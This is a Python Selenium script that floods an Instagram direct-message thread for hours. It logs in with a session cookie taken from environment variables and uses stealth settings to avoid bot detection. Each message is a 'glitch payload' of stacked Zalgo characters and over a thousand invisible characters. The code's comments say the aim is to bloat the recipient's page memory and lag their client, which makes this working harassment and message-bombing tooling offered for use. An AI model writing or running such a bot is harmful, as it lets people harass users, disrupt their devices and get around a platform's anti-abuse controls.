# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (V100 AGGRESSIVE)
# 📅 STATUS: MAXIMUM OVERFLOW | 2 THREADS | 120s RESTART

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- V100 AGGRESSIVE CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.05, 0.15) # Faster burst for higher pressure
SESSION_LIMIT = 120     

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

sys.stdout.reconfigure(encoding='utf-8')

# --- THE AGGRESSIVE PAYLOAD ---
def get_heavy_glitch_payload(target):
    # Massive Zalgo stacking for vertical "bleeding"
    zalgo_chars = ["̸", "̸", "̸", "̸", "̸", "̸", "̸", "̸", "̸", "̸", "̸"]
    def make_zalgo(text):
        return "".join(c + "".join(random.sample(zalgo_chars, 8)) for c in text)
    
    # 1500+ Invisible characters for pure DOM memory bloat
    bloat = "".join(random.choice(["‎", "‏", "‌", "‍"]) for _ in range(random.randint(800, 1500)))
    
    # Construction of the "Automation Killer" brick
    header = f"⚠️ CRITICAL OVERLOAD: {target.upper()} ⚠️\n"
    body = make_zalgo("PRAVEER_OWNZ_YOU_") * 10
    footer = "\n" + "🛑" * 40
    
    return f"{header}{bloat}\n{body}{footer}"

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        time.sleep(2) 
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        mobile_emulation = {
            "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
            "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        }
        chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"v100_agg_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")

        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Linux armv8l", 
            webgl_vendor="ARM",
            renderer="Mali-G76",
            fix_hairline=True,
        )
        driver.custom_temp_path = temp_dir
        return driver

def find_mobile_box(driver):
    selectors = ["//textarea", "//div[@role='textbox']"]
    for xpath in selectors:
        try: 
            el = driver.find_element(By.XPATH, xpath)
            if el.is_displayed(): return el
        except: continue
    return None

def adaptive_inject(driver, element, text):
    try:
        driver.execute_script("arguments[0].click();", element)
        driver.execute_script("""
            var el = arguments[0];
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, element, text)
        time.sleep(0.05)
        element.send_keys(Keys.ENTER)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    start_time = time.time()

    while (time.time() - start_time) < TOTAL_DURATION:
        driver = None
        temp_path = None
        session_start = time.time()
        
        try:
            log_status(agent_id, "🔥 Deploying Aggressive Agent...")
            driver = get_driver(agent_id)
            temp_path = getattr(driver, 'custom_temp_path', None)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(6)
            
            msg_box = find_mobile_box(driver)
            if not msg_box:
                log_status(agent_id, "❌ Box hidden. Target may be lagging already.")
                continue

            # 120s BLAZE LOOP
            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_heavy_glitch_payload(os.getenv("TARGET_NAME", "User"))
                
                if adaptive_inject(driver, msg_box, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                        if GLOBAL_SENT % 5 == 0:
                            log_status(agent_id, f"💥 TOTAL IMPACT: {GLOBAL_SENT} | SCRIPT BY PRAVEER")
                
                time.sleep(random.uniform(*BURST_SPEED))

        except Exception as e:
            log_status(agent_id, f"⚠️ Agent Stalled: {str(e)[:40]}")
        
        finally:
            log_status(agent_id, "♻️ RELOADING SOCKET...")
            if driver: driver.quit()
            if temp_path and os.path.exists(temp_path):
                shutil.rmtree(temp_path, ignore_errors=True)
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    if not cookie or not target_id:
        print("❌ CRITICAL ERROR: MISSING SECRETS")
        return

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
